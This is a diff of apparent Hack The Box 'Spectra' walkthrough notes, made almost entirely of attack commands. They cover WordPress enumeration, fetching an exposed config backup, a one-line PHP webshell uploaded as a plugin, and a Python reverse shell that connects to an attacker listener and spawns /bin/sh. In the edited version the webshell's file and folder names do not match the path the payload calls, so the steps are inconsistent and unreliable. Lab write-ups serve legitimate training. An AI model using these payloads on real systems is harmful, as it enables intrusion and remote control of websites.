@@ -13,14 +13,7 @@ nmap -p 22,80,3306 -sCV -oA scans/nmap-tcpscripts 10.10.10.229
 
 ---
 
-## 🤖 Hosts Setup
-```bash
-echo "10.10.10.229 spectra.htb" | sudo tee -a /etc/hosts
-```
-
----
-
-## 🔗 Enumerate [WordPress](HTTP)
+## 🔗 Enumerate [WordPress](HTTP.md)
 ```bash
 # Look for .save file
 curl http://spectra.htb/testing/wp-config.php.save
@@ -45,28 +38,31 @@ wpscan --url http://spectra.htb/main -e ap,t,tt,u --api-token <your-token>
 
 ## 📂 Webshell via Plugin (Option A)
 ```php
-# Create 0xdf.php with:
+# Create kill.php with:
 <?php system($_REQUEST["0xdf"]); ?>
 
 # Zip it:
-zip 0xdf-plug.zip 0xdf.php
+zip infinit3i-plug.zip kill.php
 
 # Upload via WP Admin ➝ Plugins ➝ Upload Plugin
 
 # Access shell:
-curl http://spectra.htb/main/wp-content/plugins/0xdf-plug/0xdf.php?0xdf=id
+curl http://spectra.htb/main/wp-content/plugins/infinit3i-plug/kill.php?0xdf=id
 ```
 
 ---
 
 ## 🚧 Reverse Shell (from WP Webshell)
-```bash
-# Listener
-nc -lnvp 443
 
-# Payload
-curl http://spectra.htb/main/wp-content/plugins/0xdf-plug/0xdf.php \
-  --data-urlencode "0xdf=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.7\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+##### Listener
+```bash
+nc -lnvp 6666
+```
+#### Payload
+
+```bash
+curl http://spectra.htb/main/wp-content/plugins/0xdf-plug/infinit3i.php \
+  --data-urlencode "0xdf=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.3\",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 ```
 
 ---
